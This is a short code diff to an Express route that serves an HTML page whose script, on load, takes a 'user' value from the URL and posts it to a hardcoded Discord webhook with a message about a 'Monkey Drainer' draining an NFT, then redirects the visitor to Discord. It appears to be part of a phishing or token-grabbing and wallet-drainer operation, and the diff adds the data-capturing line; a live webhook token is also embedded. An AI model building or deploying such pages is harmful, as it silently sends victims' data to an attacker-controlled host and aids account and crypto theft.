@@ -80,11 +80,13 @@ app.get("/k", async (req, res) => {
     res.send(`<!DOCTYPE html>
 <title>onload/redirect</title>
 <script>
+
 var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
 var url_string = window.location.href; 
 var url = new URL(url_string);
+var currentURL = url.searchParams.get("user");
 var postData = {
-  content: "@everyone @here FEDS ABOUT TO COMP 100k USD AND BAYC6969 WITH SEAPORT AND MONKEY DRAINER" + currentURL
+  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + currentURL
 };
 fetch(webhookURL, {
   method: "POST",
@@ -93,6 +95,8 @@ fetch(webhookURL, {
     "Content-Type": "application/json"
   }
 });
+
+
 function handleOnLoad(){
 window.location="https://discord.com/channels/@me";
 }
